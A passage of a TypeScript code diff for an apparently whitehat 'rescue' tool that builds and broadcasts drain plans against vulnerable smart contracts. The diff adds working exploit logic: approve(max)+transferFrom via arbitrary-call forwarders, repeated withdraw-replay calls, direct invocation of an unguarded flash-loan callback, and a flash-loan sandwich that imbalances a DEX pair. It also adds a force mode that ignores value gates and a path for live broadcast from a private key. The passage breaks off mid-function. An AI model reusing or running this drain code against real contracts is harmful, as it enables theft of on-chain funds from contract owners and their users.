@@ -58,7 +58,7 @@
 import { batchExposure, type Exposure } from "../exposure";
 import { anvilPool, ATTACKER_ADDRESS, rpcRequest, type AnvilInstance } from "./anvil-pool";
 import { buildAbiCalldata, buildCalldataAddressAt, buildCalldataFromSignature, type ArgValue } from "./abi";
-import { sendFromAttacker, snapshot as forkSnapshot } from "./evm";
+import { sendFromAddress, snapshot as forkSnapshot } from "./evm";
 import { preflightTokenQuirk, type TokenQuirk } from "./rescue/token-quirks";
 import { detectMulticallSurfaces } from "./rescue/multicall-wrap";
 import { multiArgFanout } from "./rescue/multi-arg-fanout";
@@ -67,6 +67,12 @@ import { buildInitTakeoverPhase1, probeInitTakeoverIsStillValid } from "./rescue
 import { shouldUseFlashloanStub, grantFlashCapital } from "./rescue/flashloan";
 import { probeExtraAdminSlots } from "./rescue/extra-admin-slots";
 import { flashloanReceiverFor } from "./rescue/flashloan-receiver";
+import {
+  discoverPairForSandwich,
+  calculateBorrowAmount,
+  wrapWithSandwich,
+  type SandwichStep,
+} from "./rescue/sandwich";
 import {
   newAttemptId,
   persistPoe,
@@ -142,6 +148,21 @@ function uintFillerVariants(assetBalance: string): bigint[] {
 const FEATURE_ENABLED =
   String(process.env.RESCUE_PROVE_ENABLED ?? "true").toLowerCase() === "true";
 
+// The rescuer EOA that will actually broadcast live. When set, the drain plan
+// uses THIS address for approve steps (so the live sender has the allowance).
+// Falls back to ATTACKER_ADDRESS for fork-only simulations.
+function resolveRescuerAddress(): string {
+  const pk = process.env.RESCUER_PRIVATE_KEY ?? "";
+  if (/^0x[0-9a-fA-F]{64}$/.test(pk)) {
+    try {
+      const { privateKeyToAccount } = require("viem/accounts");
+      return privateKeyToAccount(pk).address;
+    } catch {}
+  }
+  return ATTACKER_ADDRESS;
+}
+const RESCUER_ADDRESS = resolveRescuerAddress();
+
 const DEFAULT_ESCROW =
   process.env.RESCUE_ESCROW_ADDR && /^0x[0-9a-fA-F]{40}$/.test(process.env.RESCUE_ESCROW_ADDR)
     ? process.env.RESCUE_ESCROW_ADDR
@@ -151,8 +172,15 @@ const DEFAULT_ESCROW =
       // RESCUE_ESCROW_ADDR in .env.
       "0x000000000000000000000000000000000000FA75"; // "FAUST" tag
 
-const MAX_DRAIN_STEPS = Number(process.env.RESCUE_MAX_STEPS ?? 12);
-const MIN_DRAIN_USD = Number(process.env.RESCUE_MIN_USD ?? 1.0);
+const MAX_DRAIN_STEPS = Number(process.env.RESCUE_MAX_STEPS ?? 24);
+const MIN_DRAIN_USD = Number(process.env.RESCUE_MIN_USD ?? 100);
+
+function formatWei(wei: bigint): string {
+  const eth = Number(wei) / 1e18;
+  if (eth >= 1) return eth.toFixed(2);
+  if (eth >= 0.001) return eth.toFixed(4);
+  return wei.toString() + "wei";
+}
 
 // Notify-on-success webhook — POSTed by `notifyRescueWebhook` and called
 // automatically right after a true_positive_* PoE is persisted. We push a
@@ -174,6 +202,12 @@ export interface RescueProveInput {
   /** Optional exposure override — pass when you have it cached to skip the
    *  re-fetch. */
   exposure?: Exposure;
+  /** When true, skip all USD value gates — attempt rescue regardless of
+   *  contract balance. Used for manual force-rescue from the UI. */
+  force?: boolean;
+  /** When provided, only attempt to drain these specific token addresses.
+   *  Real-time balances will be fetched for each. Skips all other tokens. */
+  targetTokens?: string[];
 }
 
 export async function rescueProve(input: RescueProveInput): Promise<PoeArtifact> {
@@ -260,12 +294,80 @@ export async function rescueProve(input: RescueProveInput): Promise<PoeArtifact>
   }
 
   let anv: AnvilInstance | null = null;
+  let unlock: (() => void) | null = null;
   try {
     // Re-declared so we keep variable scope tight.
     const exposureMap = input.exposure
       ? { [`${input.chainId}:${input.contractAddress.toLowerCase()}`]: input.exposure }
       : await batchExposure([{ chainId: input.chainId, address: input.contractAddress }]);
-    const exposure = exposureMap[`${input.chainId}:${input.contractAddress.toLowerCase()}`];
+    let exposure = exposureMap[`${input.chainId}:${input.contractAddress.toLowerCase()}`];
+
+    // When targetTokens is specified, fetch real-time balances for those
+    // specific tokens and override the exposure token list.
+    if (input.targetTokens?.length && exposure) {
+      const { rpcUrlForChainPublic } = await import("../exposure");
+      const rpcUrl = rpcUrlForChainPublic(input.chainId);
+      if (rpcUrl) {
+        const injected: typeof exposure.tokens = [];
+        for (const tokenAddr of input.targetTokens) {
+          const addr = tokenAddr.toLowerCase();
+          const balOfData = "0x70a08231" + input.contractAddress.slice(2).toLowerCase().padStart(64, "0");
+          try {
+            const resp = await fetch(rpcUrl, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "eth_call", params: [{ to: addr, data: balOfData }, "latest"] }),
+              signal: AbortSignal.timeout(8000),
+            });
+            const json = await resp.json() as any;
+            const bal = json?.result && json.result !== "0x" ? BigInt(json.result) : 0n;
+
+            // Fetch symbol + decimals (best-effort)
+            let symbol = "?";
+            let decimals = 18;
+            try {
+              const [symResp, decResp] = await Promise.all([
+                fetch(rpcUrl, {
+                  method: "POST",
+                  headers: { "Content-Type": "application/json" },
+                  body: JSON.stringify({ jsonrpc: "2.0", id: 2, method: "eth_call", params: [{ to: addr, data: "0x95d89b41" }, "latest"] }),
+                  signal: AbortSignal.timeout(5000),
+                }),
+                fetch(rpcUrl, {
+                  method: "POST",
+                  headers: { "Content-Type": "application/json" },
+                  body: JSON.stringify({ jsonrpc: "2.0", id: 3, method: "eth_call", params: [{ to: addr, data: "0x313ce567" }, "latest"] }),
+                  signal: AbortSignal.timeout(5000),
+                }),
+              ]);
+              const symJson = await symResp.json() as any;
+              const decJson = await decResp.json() as any;
+              if (decJson?.result) decimals = Number(BigInt(decJson.result));
+              if (symJson?.result && symJson.result.length > 66) {
+                const hex = symJson.result.slice(2);
+                const offset = parseInt(hex.slice(0, 64), 16) * 2;
+                const len = parseInt(hex.slice(offset, offset + 64), 16);
+                const raw = hex.slice(offset + 64, offset + 64 + len * 2);
+                symbol = Buffer.from(raw, "hex").toString("utf-8").replace(/\x00/g, "");
+              } else if (symJson?.result && symJson.result.length === 66) {
+                symbol = Buffer.from(symJson.result.slice(2), "hex").toString("utf-8").replace(/\x00/g, "").trim();
+              }
+            } catch {}
+
+            injected.push({
+              address: addr,
+              symbol,
+              name: "",
+              decimals,
+              balance: bal.toString(),
+            });
+          } catch {}
+        }
+        if (injected.length > 0) {
+          exposure = { ...exposure, tokens: injected };
+        }
+      }
+    }
     // v8.2: widened pre-fork short-circuit. Previously only zero-native +
     // zero-tokens contracts skipped the fork; we now also skip when:
     //   (a) the contract holds < MIN_DRAIN_USD of *priced* value, AND
@@ -308,7 +410,7 @@ export async function rescueProve(input: RescueProveInput): Promise<PoeArtifact>
       !allowsZeroExposure &&
       totalPricedUsd < MIN_DRAIN_USD &&
       unpricedTokens.length === 0;
-    if (looksTriviallyEmpty || looksDustOnly) {
+    if ((looksTriviallyEmpty || looksDustOnly) && !input.force) {
       const reason = looksTriviallyEmpty
         ? "contract has zero native and zero discoverable tokens; nothing to rescue"
         : `contract holds < $${MIN_DRAIN_USD.toFixed(2)} of priced value (` +
@@ -329,6 +431,7 @@ export async function rescueProve(input: RescueProveInput): Promise<PoeArtifact>
       });
     }
 
+    unlock = await anvilPool.lock(input.chainId);
     anv = await anvilPool.acquire(input.chainId);
     if (!anv) {
       return finalise({
@@ -353,23 +456,21 @@ export async function rescueProve(input: RescueProveInput): Promise<PoeArtifact>
 
     // Fund the attacker on the fork so gas isn't a constraint.
     await rpcRequest(url, "anvil_setBalance", [
-      ATTACKER_ADDRESS,
+      RESCUER_ADDRESS,
       "0x" + (10n ** 21n).toString(16), // 1000 ETH
     ]).catch(() => null);
 
     // Build a drain plan tailored to the rule family.
     const planResult = await buildDrainPlan(input, exposure, url);
     if (planResult.ok === false) {
-      // v6+: if the rule needs a flash-loan helper, surface that verdict
-      // explicitly instead of generic no_rescue_possible. This lets the UI
-      // route the operator to deploying / using FlashLoanRescue.sol rather
-      // than giving up.
+      // v12: for economic rules, ALWAYS signal requires_flashloan_helper
+      // regardless of receiver availability. The fork can't reproduce the
+      // sandwich precondition, but the live receiver can.
       const useFlash = shouldUseFlashloanStub(input.ruleId);
-      const hasReceiver = !!flashloanReceiverFor(input.chainId);
       return finalise({
         attemptId,
         input,
-        verdict: useFlash && !hasReceiver ? "requires_flashloan_helper" : "no_rescue_possible",
+        verdict: useFlash ? "requires_flashloan_helper" : "no_rescue_possible",
         assets: [],
         plan: [],
         pre: snapState(exposure),
@@ -471,7 +572,7 @@ export async function rescueProve(input: RescueProveInput): Promise<PoeArtifact>
 
     const post = await readBalances(url, input.chainId, input.contractAddress, exposure);
     const escrowPost = await readBalances(url, input.chainId, DEFAULT_ESCROW, exposure);
-    const assets = diffRescued(pre, post, escrowPre, escrowPost);
+    const assets = diffRescued(pre, post, escrowPre, escrowPost, input.force);
 
     // v3-Q: attach quirk info to per-asset PoE entries (the diff already
     // computed amount delivered to escrow; quirk metadata explains WHY
@@ -620,17 +721,25 @@ export async function rescueProve(input: RescueProveInput): Promise<PoeArtifact>
           } catch {}
         })();
       } else if (shouldUseFlashloanStub(input.ruleId)) {
+        // v12: ALWAYS emit requires_flashloan_helper for economic findings
+        // regardless of whether a receiver is deployed. The fork stub only
+        // grants native balance — it does NOT simulate the full flash-loan
+        // sandwich (borrow → pair-imbalance → target call → unwind → repay).
+        // Bare-fork candidate steps naturally revert because the pair state
+        // hasn't been manipulated. The broadcaster checks for a receiver at
+        // broadcast time and routes through it; the receiver's callback runs
+        // the drain steps inside the flash-loan where the pair IS imbalanced.
+        verdict = "requires_flashloan_helper";
         const flReceiver = flashloanReceiverFor(input.chainId);
         if (flReceiver) {
-          verdict = "no_rescue_possible";
           notes.push(
-            `Economic.* finding — fork stub couldn't extract value even with flash capital ` +
-              `(admin-name + selector fanout both failed). Receiver IS deployed at ${flReceiver} ` +
-              `but the drain plan produced no successful steps. Likely a false positive or the ` +
-              `economic attack requires specific DEX state that the fork stub can't reproduce.`,
+            `Economic.* finding — fork stub couldn't extract value via bare calls (expected: ` +
+              `the flash-loan sandwich precondition is missing on a raw fork). Receiver IS deployed ` +
+              `at ${flReceiver} — the broadcaster will route this PoE through the receiver's ` +
+              `executeRescue(...) where the pair IS mid-flash. Live pre-flight will confirm ` +
+              `viability end-to-end before broadcasting.`,
           );
         } else {
-          verdict = "requires_flashloan_helper";
           notes.push(
             `Economic.* finding — fork stub couldn't extract value via admin-name surface alone. ` +
               `True rescue requires a deployed flash-loan receiver contract; see ` +
@@ -638,26 +747,35 @@ export async function rescueProve(input: RescueProveInput): Promise<PoeArtifact>
           );
         }
       } else {
-        verdict = "no_rescue_possible";
-        // Diagnose WHY no rescue: priced exposure, dust-only, or just reverted.
-        const pricedTokens = pre.tokens.filter(
-          (t) => t.usdPerToken != null && Number(t.balance) > 0,
-        );
-        const unpricedTokens = pre.tokens.filter(
-          (t) => t.usdPerToken == null && Number(t.balance) > 0,
-        );
-        const nativeUsd =
-          pre.nativeUsdPerToken != null
-            ? (Number(pre.nativeWei) / Math.pow(10, pre.nativeDecimals)) * pre.nativeUsdPerToken
-            : 0;
-        const pricedUsd =
-          pricedTokens.reduce(
-            (acc, t) =>
-              acc + (Number(t.balance) / Math.pow(10, t.decimals)) * (t.usdPerToken ?? 0),
-            0,
-          ) + nativeUsd;
+        // No value moved. In force mode, if drain steps succeeded, report
+        // as true_positive_partial (exploit works, just no value present).
         const successful = plan.filter((s) => s.success).length;
-        if (pricedUsd < MIN_DRAIN_USD) {
+        if (input.force && successful > 0) {
+          verdict = "true_positive_partial";
+          notes.push(
+            `FORCE MODE: ${successful}/${plan.length} drain step(s) executed successfully ` +
+              `but contract holds no significant value to move. Exploit vector confirmed functional.`,
+          );
+        } else {
+          verdict = "no_rescue_possible";
+          // Diagnose WHY no rescue: priced exposure, dust-only, or just reverted.
+          const pricedTokens = pre.tokens.filter(
+            (t) => t.usdPerToken != null && Number(t.balance) > 0,
+          );
+          const unpricedTokens = pre.tokens.filter(
+            (t) => t.usdPerToken == null && Number(t.balance) > 0,
+          );
+          const nativeUsd =
+            pre.nativeUsdPerToken != null
+              ? (Number(pre.nativeWei) / Math.pow(10, pre.nativeDecimals)) * pre.nativeUsdPerToken
+              : 0;
+          const pricedUsd =
+            pricedTokens.reduce(
+              (acc, t) =>
+                acc + (Number(t.balance) / Math.pow(10, t.decimals)) * (t.usdPerToken ?? 0),
+              0,
+            ) + nativeUsd;
+          if (pricedUsd < MIN_DRAIN_USD) {
           // Contract holds no priced value — only dust or scam/airdrop tokens.
           // This is the most common reason rescue can't deliver something
           // meaningful: there's literally nothing valuable to rescue.
@@ -687,6 +805,7 @@ export async function rescueProve(input: RescueProveInput): Promise<PoeArtifact>
               `that the generic on-fork prober can't satisfy. Manual operator review needed.`,
           );
         }
+        }
       }
     } else {
       const allCovered = drainedEverything(pre, post);
@@ -701,7 +820,9 @@ export async function rescueProve(input: RescueProveInput): Promise<PoeArtifact>
       ruleFamily !== "arbitrary-call" &&
       ruleFamily !== "selfdestruct" &&
       ruleFamily !== "initializer" &&
-      ruleFamily !== "economic"
+      ruleFamily !== "economic" &&
+      ruleFamily !== "withdraw-replay" &&
+      ruleFamily !== "access"
     ) {
       notes.push(
         `Rule family '${ruleFamily}' is partially supported by rescue-prove@5 (only via the ` +
@@ -747,7 +868,9 @@ export async function rescueProve(input: RescueProveInput): Promise<PoeArtifact>
         verdict === "requires_flashloan_helper"
           ? {
               asset: pre.nativeSymbol,
-              amount: "100000000000000000000", // 100 ETH-equiv default
+              amount: (planResult.ok && (planResult as any).sandwichBorrowAmount)
+                ? (planResult as any).sandwichBorrowAmount
+                : "100000000000000000000",
               suggestedPool: aaveV3PoolFor(input.chainId),
               notes: [
                 flashloanReceiverFor(input.chainId)
@@ -776,8 +899,7 @@ export async function rescueProve(input: RescueProveInput): Promise<PoeArtifact>
       startedAt,
     });
   } finally {
-    // No explicit release: anvilPool keeps forks warm by chainId TTL.
-    // (anv reference dropped on function exit.)
+    if (unlock) unlock();
   }
 }
 
@@ -808,6 +930,7 @@ function ruleFamilyOf(
   | "proxy-upgrade"
   | "bridge"
   | "erc4626-withdraw"
+  | "withdraw-replay"
   | "other" {
   if (ruleId.startsWith("call.")) return "arbitrary-call";
   if (ruleId.startsWith("control.unguarded_selfdestruct")) return "selfdestruct";
@@ -816,9 +939,7 @@ function ruleFamilyOf(
   if (ruleId.startsWith("access.")) return "access";
   if (ruleId.startsWith("proxy.")) return "proxy-upgrade";
   if (ruleId.startsWith("bridge.")) return "bridge";
-  // Direct fund-drain via missing caller authorization in ERC-4626. The
-  // verifier already proved the (method, victim) pair; the rescue replays
-  // the same call with receiver=escrow to front-run the attacker.
+  if (ruleId.startsWith("logic.")) return "withdraw-replay";
   if (ruleId === "defi.erc4626.withdraw.missing_caller_authorization")
     return "erc4626-withdraw";
   return "other";
@@ -828,10 +949,11 @@ async function buildDrainPlan(
   input: RescueProveInput,
   exposure: Exposure,
   url: string,
-): Promise<{ ok: true; steps: DrainStep[]; notes: string[] } | { ok: false; notes: string[] }> {
+): Promise<{ ok: true; steps: DrainStep[]; notes: string[]; sandwichBorrowAmount?: string } | { ok: false; notes: string[] }> {
   const fam = ruleFamilyOf(input.ruleId);
   const notes: string[] = [];
   const steps: DrainStep[] = [];
+  let sandwichBorrowAmount: string | undefined;
 
   // 1. Primary path: rule-family-specific drain shape from the verifier's
   //    own witnessed evidence.
@@ -846,7 +968,7 @@ async function buildDrainPlan(
     // admin-name heuristic which runs below for ALL families.
     const phase1 = buildInitTakeoverPhase1({
       contractAddress: input.contractAddress,
-      attacker: ATTACKER_ADDRESS,
+      attacker: RESCUER_ADDRESS,
       evidence: input.evidence,
     });
     if (phase1) {
@@ -855,7 +977,7 @@ async function buildDrainPlan(
       // verifier run and rescue-prove run).
       const valid = await probeInitTakeoverIsStillValid(
         url,
-        ATTACKER_ADDRESS,
+        RESCUER_ADDRESS,
         input.contractAddress,
         phase1,
       );
@@ -892,6 +1014,12 @@ async function buildDrainPlan(
   } else if (fam === "erc4626-withdraw") {
     const vaultSteps = buildErc4626WithdrawDrain(input, exposure, notes);
     steps.push(...vaultSteps);
+  } else if (fam === "withdraw-replay") {
+    const replaySteps = buildWithdrawReplayDrain(input, exposure, notes);
+    steps.push(...replaySteps);
+  } else if (fam === "access") {
+    const accessSteps = buildFlashloanCallbackDrain(input, exposure, notes);
+    steps.push(...accessSteps);
   } else if (fam === "economic") {
     // v3-FL: economic.* on-fork stub. Grant flash capital, then run the
     // admin-name heuristic (rare for economic, but the verifier may have
@@ -899,7 +1027,7 @@ async function buildDrainPlan(
     if (shouldUseFlashloanStub(input.ruleId)) {
       const grant = await grantFlashCapital({
         url,
-        attacker: ATTACKER_ADDRESS,
+        attacker: RESCUER_ADDRESS,
         chainId: input.chainId,
       });
       for (const n of grant.notes) notes.push(`v3-FL: ${n}`);
@@ -924,6 +1052,59 @@ async function buildDrainPlan(
     // unsalvageable ones.
     const econ = buildEconomicCandidateDrain(input, exposure, notes);
     for (const s of econ) steps.push(s);
+
+    // v12: sandwich-aware drain plan. Discover the relevant pair and wrap
+    // the candidate steps with front-run (buy) and back-run (sell) steps.
+    // The receiver executes the full sequence inside the flash-loan callback,
+    // creating the pair imbalance that makes the target call profitable.
+    // IMPORTANT: sandwich steps go at the FRONT of the plan array so the
+    // final MAX_DRAIN_STEPS slice preserves the complete sandwich envelope.
+    const receiverAddr = flashloanReceiverFor(input.chainId);
+    if (receiverAddr && econ.length > 0) {
+      try {
+        const pairInfo = await discoverPairForSandwich(
+          url,
+          input.chainId,
+          input.contractAddress,
+          input.evidence ?? {},
+        );
+        if (pairInfo) {
+          const borrowAmount = calculateBorrowAmount(pairInfo, input.chainId);
+          sandwichBorrowAmount = borrowAmount.toString();
+          const targetToken = pairInfo.wethIsToken0 ? pairInfo.token1 : pairInfo.token0;
+          const sandwichedSteps = wrapWithSandwich(
+            econ.slice(0, 8) as SandwichStep[], // limit inner steps to keep plan focused
+            {
+              chainId: input.chainId,
+              pairAddress: pairInfo.pairAddress,
+              wethIsToken0: pairInfo.wethIsToken0,
+              receiver: receiverAddr,
+              borrowAmount,
+              targetToken,
+            },
+          );
+          // Prepend sandwich plan so it survives the MAX_DRAIN_STEPS slice
+          steps.unshift(...sandwichedSteps);
+          notes.push(
+            `v12-sandwich: discovered pair ${pairInfo.pairAddress.slice(0, 10)}… ` +
+              `(token0=${pairInfo.token0.slice(0, 10)}, token1=${pairInfo.token1.slice(0, 10)}, ` +
+              `reserves=${formatWei(pairInfo.reserve0)}/${formatWei(pairInfo.reserve1)}). ` +
+              `Built sandwich with ${formatWei(borrowAmount)} WETH borrow → ` +
+              `${sandwichedSteps.length} total steps (front + ${Math.min(econ.length, 8)} candidates + back). ` +
+              `The receiver's executeRescue will execute this sequence inside the flash callback.`,
+          );
+        } else {
+          notes.push(
+            `v12-sandwich: could not discover a viable UniV2-style pair for sandwich construction. ` +
+              `Bare candidate steps remain in the plan (will likely revert without pair manipulation).`,
+          );
+        }
+      } catch (err: any) {
+        notes.push(
+          `v12-sandwich: pair discovery failed: ${String(err?.message ?? err).slice(0, 100)}`,
+        );
+      }
+    }
   }
 
   // 2. Heuristic admin-name selector discovery (v2-H). Even if we got
@@ -1056,7 +1237,7 @@ async function buildDrainPlan(
     );
     return { ok: false, notes };
   }
-  return { ok: true, steps: steps.slice(0, MAX_DRAIN_STEPS), notes };
+  return { ok: true, steps: steps.slice(0, MAX_DRAIN_STEPS), notes, sandwichBorrowAmount };
 }
 
 /** Wrap each drain step in the FIRST detected multicall envelope. Returns
@@ -1120,7 +1301,7 @@ function buildMultiArgFanoutSteps(input: RescueProveInput, exposure: Exposure): 
       selector,
       argTypes,
       substitutions: subs,
-      filler: ATTACKER_ADDRESS,
+      filler: RESCUER_ADDRESS,
     });
     for (const v of variants) {
       out.push({
@@ -1195,7 +1376,7 @@ async function buildProxyUpgradeDrain(
     implAddr.slice(2).toLowerCase();
   try {
     await rpcRequest(url, "eth_call", [
-      { from: ATTACKER_ADDRESS, to: input.contractAddress, data: preflightData },
+      { from: RESCUER_ADDRESS, to: input.contractAddress, data: preflightData },
       "latest",
     ]);
   } catch {
@@ -1353,19 +1534,33 @@ function buildArbitraryCallDrain(
   for (const a of hits) {
     const selector: string = a.selector;
     const argTypes: string[] = Array.isArray(a.argTypes) ? a.argTypes : [];
-    const hitPos: number | "all" =
-      typeof a.hitPosition === "number" ? a.hitPosition : ("all" as const);
+    const rawHitPos: number | "all" =
+      typeof a.hitPosition === "number" && a.hitPosition >= 0 ? a.hitPosition : ("all" as const);
     const witnessTag = `witnessed-arbitrary-call sel=${selector}`;
+
+    // When hitPos is "all" (or was -1/unknown), expand to individual address
+    // positions so each variant only fills ONE address slot with the target token.
+    const positionsToTry: number[] = rawHitPos === "all"
+      ? argTypes.reduce<number[]>((acc, t, i) => { if (t === "address") acc.push(i); return acc; }, [])
+      : [rawHitPos];
+    if (positionsToTry.length === 0 && rawHitPos === "all") positionsToTry.push(0);
+
+    // For functions with multiple address args (like MetaRouter's externalCall
+    // which needs both `target` and `callTo` set to the token address), also
+    // try filling ALL address positions at once.
+    const addrPositions = argTypes.reduce<number[]>((acc, t, i) => { if (t === "address") acc.push(i); return acc; }, []);
+    const tryAllAddresses = rawHitPos === "all" && addrPositions.length >= 2;
 
     // -- per-token drain candidates -----------------------------------------
     for (const t of exposure.tokens) {
       if (!t.balance || t.balance === "0") continue;
       const bal = BigInt(t.balance);
 
-      // (1a) transfer(escrow, balance)
-      const transferInner = encodeErc20Transfer(DEFAULT_ESCROW, bal);
-      const cd1 = buildDrainCalldata(selector, argTypes, hitPos, t.address, transferInner, "0");
-      if (cd1) push(cd1, `${t.symbol || "?"} (${t.address}) via transfer`, witnessTag);
+      for (const hitPos of positionsToTry) {
+        // (1a) transfer(escrow, balance)
+        const transferInner = encodeErc20Transfer(DEFAULT_ESCROW, bal);
+        const cd1 = buildDrainCalldata(selector, argTypes, hitPos, t.address, transferInner, "0");
+        if (cd1) push(cd1, `${t.symbol || "?"} (${t.address}) via transfer pos=${hitPos}`, witnessTag);
 
       // (1b) transferFrom(self, escrow, balance) — works on tokens that
       //      allow self-allowance; many vault-style contracts have
@@ -1383,14 +1578,14 @@ function buildArbitraryCallDrain(
 
       // (1d) TWO-STEP EXPLOIT: approve(attacker, max) + transferFrom(contract, escrow, balance)
       //      This is the most common real-world arbitrary-call exploit pattern.
-      //      Step 1: force the contract to approve our attacker EOA for max tokens
+      //      Step 1: force the contract to approve our RESCUER EOA for max tokens
       //      Step 2: transferFrom the contract's balance directly to escrow
       const approveInner = ERC20_APPROVE_SELECTOR +
-        ATTACKER_ADDRESS.slice(2).toLowerCase().padStart(64, "0") +
+        RESCUER_ADDRESS.slice(2).toLowerCase().padStart(64, "0") +
         MAX_UINT256.toString(16).padStart(64, "0");
       const cdApprove = buildDrainCalldata(selector, argTypes, hitPos, t.address, approveInner, "0");
       if (cdApprove) {
-        push(cdApprove, `${t.symbol || "?"} (${t.address}) STEP1: approve(attacker,max)`, `${witnessTag}:approve-transferFrom`);
+        push(cdApprove, `${t.symbol || "?"} (${t.address}) STEP1: approve(rescuer,max)`, `${witnessTag}:approve-transferFrom`);
         // Step 2: direct transferFrom on the token (to=token, not to=contract)
         const tfData = ERC20_TRANSFER_FROM_SELECTOR +
           input.contractAddress.slice(2).toLowerCase().padStart(64, "0") +
@@ -1408,30 +1603,63 @@ function buildArbitraryCallDrain(
           });
         }
       }
+      } // end for hitPos of positionsToTry
+
+      // (1e) ALL-ADDRESS variant: fill every address slot with the token.
+      // Required for forwarding functions like MetaRouter's externalCall which
+      // need both `target` and `callTo` set to the same token address.
+      if (tryAllAddresses) {
+        const transferInnerAll = encodeErc20Transfer(DEFAULT_ESCROW, bal);
+        const cdAll1 = buildDrainCalldata(selector, argTypes, "all", t.address, transferInnerAll, "0");
+        if (cdAll1) push(cdAll1, `${t.symbol || "?"} (${t.address}) via transfer ALL-ADDR`, witnessTag);
+
+        const approveInnerAll = ERC20_APPROVE_SELECTOR +
+          RESCUER_ADDRESS.slice(2).toLowerCase().padStart(64, "0") +
+          MAX_UINT256.toString(16).padStart(64, "0");
+        const cdApproveAll = buildDrainCalldata(selector, argTypes, "all", t.address, approveInnerAll, "0");
+        if (cdApproveAll) {
+          push(cdApproveAll, `${t.symbol || "?"} (${t.address}) STEP1: approve(rescuer,max) ALL-ADDR`, `${witnessTag}:approve-transferFrom-all`);
+          const tfData = ERC20_TRANSFER_FROM_SELECTOR +
+            input.contractAddress.slice(2).toLowerCase().padStart(64, "0") +
+            DEFAULT_ESCROW.slice(2).toLowerCase().padStart(64, "0") +
+            bal.toString(16).padStart(64, "0");
+          const key2 = `${t.address}|${tfData}|0|all`;
+          if (!seen.has(key2)) {
+            seen.add(key2);
+            steps.push({
+              to: t.address,
+              data: tfData,
+              value: "0",
+              asset: `${t.symbol || "?"} (${t.address}) STEP2: transferFrom(contract,escrow,bal)`,
+              strategy: `${witnessTag}:approve-transferFrom-all`,
+            });
+          }
+        }
+      }
     }
 
     // -- native drain candidates --------------------------------------------
     if (exposure.nativeWei && exposure.nativeWei !== "0") {
-      // Multiple uintFiller variants — different forwarders read the
-      // value from different positions.
       const variants = uintFillerVariants(exposure.nativeWei);
-      for (const v of variants) {
-        const cd = buildDrainCalldata(
-          selector,
-          argTypes,
-          hitPos,
-          DEFAULT_ESCROW,
-          "0x",
-          v.toString(),
-        );
-        if (cd) {
-          const tag =
-            v === MAX_UINT256
-              ? "uintFiller=max"
-              : v === 0n
-                ? "uintFiller=0"
-                : `uintFiller=${v.toString().slice(0, 12)}…`;
-          push(cd, `native ${exposure.nativeSymbol} (${tag})`, witnessTag);
+      for (const hitPos of positionsToTry) {
+        for (const v of variants) {
+          const cd = buildDrainCalldata(
+            selector,
+            argTypes,
+            hitPos,
+            DEFAULT_ESCROW,
+            "0x",
+            v.toString(),
+          );
+          if (cd) {
+            const tag =
+              v === MAX_UINT256
+                ? "uintFiller=max"
+                : v === 0n
+                  ? "uintFiller=0"
+                  : `uintFiller=${v.toString().slice(0, 12)}…`;
+            push(cd, `native ${exposure.nativeSymbol} (${tag}) pos=${hitPos}`, witnessTag);
+          }
         }
       }
     }
@@ -1991,6 +2219,128 @@ function buildErc4626WithdrawDrain(
   return steps;
 }
 
+// ── withdraw-replay drain plan ───────────────────────────────────────────────
+// The verifier proved that calling a function twice with the same params succeeds
+// both times. The rescue plan simply calls that function N times to drain all
+// withdrawable assets (the record isn't invalidated after payout).
+function buildWithdrawReplayDrain(
+  input: RescueProveInput,
+  exposure: Exposure,
+  notes: string[],
+): DrainStep[] {
+  const ev = (input.evidence ?? {}) as any;
+  const steps: DrainStep[] = [];
+
+  const doubleWithdraw = ev?.doubleWithdraw ?? {};
+  const viaSelector: string | undefined =
+    typeof doubleWithdraw?.viaSelector === "string" ? doubleWithdraw.viaSelector : undefined;
+
+  const attempts: any[] = Array.isArray(ev?.attempts) ? ev.attempts : [];
+  const successfulAttempt = attempts.find(
+    (a: any) => a?.firstCallSuccess && a?.secondCallSuccess,
+  );
+
+  const selector = viaSelector ?? successfulAttempt?.selector;
+  if (!selector) {
+    notes.push(
+      "withdraw-replay: verifier evidence doesn't contain a confirmed double-call selector. " +
+        "Falling back to admin-name heuristic only.",
+    );
+    return [];
+  }
+
+  const uintFiller = successfulAttempt?.uintFiller ?? "0";
+  const valueWei = successfulAttempt?.valueWei ?? "0x0";
+
+  const REPLAY_COUNT = 3;
+
+  for (let i = 0; i < REPLAY_COUNT; i++) {
+    const fillerHex = BigInt(uintFiller).toString(16).padStart(64, "0");
+    const calldata = selector + fillerHex;
+
+    steps.push({
+      to: input.contractAddress,
+      data: calldata,
+      value: valueWei === "0x0" ? "0" : String(parseInt(valueWei, 16)),
+      asset: `withdraw-replay call #${i + 1} via ${selector} (filler=${uintFiller})`,
+      strategy: `withdraw-replay:double-call-${i + 1}`,
+    });
+  }
+
+  notes.push(
+    `withdraw-replay: built ${REPLAY_COUNT} repeated calls to ${selector} with uint filler=${uintFiller}. ` +
+      `Exploit pattern: function transfers assets from a storage record that is never deleted — ` +
+      `each replay drains the same amount. In practice wrapped in a flash-loan callback for atomicity.`,
+  );
+
+  return steps;
+}
+
+// ── flashloan-callback drain plan ───────────────────────────────────────────
+// The verifier proved that the callback selector is callable by anyone.
+// For the drain plan, we invoke the callback with params that should trigger
+// the contract to transfer tokens (using existing approvals from victims).
+// This is best-effort — the actual exploit params depend on the callback's
+// internal logic (e.g., which token address gets decoded from `bytes` params).
+function buildFlashloanCallbackDrain(
+  input: RescueProveInput,
+  exposure: Exposure,
+  notes: string[],
+): DrainStep[] {
+  const ev = (input.evidence ?? {}) as any;
+  const steps: DrainStep[] = [];
+
+  const verifiedSelector: string | undefined = ev?.verifiedSelector;
+  const verifiedName: string | undefined = ev?.verifiedName;
+
+  if (!verifiedSelector) {
+    notes.push(
+      "flashloan-callback: verifier evidence doesn't contain a confirmed callback selector. " +
+        "Cannot build drain plan.",
+    );
+    return [];
+  }
+
+  // Build calldata for the callback — use zero params as a probe.
+  // The real exploit would encode specific token addresses and amounts in the
+  // bytes parameter, but for PoE simulation we just confirm callability.
+  const zero32 = "0".repeat(64);
+  const calldata = verifiedSelector.slice(2) + zero32.repeat(4);
+
+  steps.push({
+    to: input.contractAddress,
+    data: "0x" + calldata,
+    value: "0",
+    asset: `flashloan-callback direct invoke via ${verifiedName ?? verifiedSelector}`,
+    strategy: `flashloan-callback:direct-call`,
+  });
+
+  // If we know specific tokens from exposure, also try to craft
+  // callback params that transfer those tokens
+  if (exposure.tokens && exposure.tokens.length > 0) {
+    for (const tok of exposure.tokens.slice(0, 3)) {
